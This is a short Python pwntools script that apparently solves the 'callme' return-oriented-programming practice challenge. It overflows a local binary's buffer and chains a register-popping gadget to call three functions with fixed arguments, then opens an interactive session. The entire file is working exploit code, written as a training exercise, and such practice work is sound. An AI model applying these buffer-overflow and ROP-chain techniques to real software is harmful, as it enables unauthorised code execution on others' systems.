#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./callme")
sh = process("./callme")

callme_one = 0x00401850
callme_two = 0x00401870
callme_three = 0x00401810
pwnme = 0x00401A05
pop_rdi_rsi_rdx = 0x00401ab0

payload = ""
payload += "A"*40
payload += p64(pop_rdi_rsi_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_one)
payload += p64(pop_rdi_rsi_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_two)
payload += p64(pop_rdi_rsi_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_three)
payload += p64(pwnme)

sh.sendline(payload)
sh.interactive()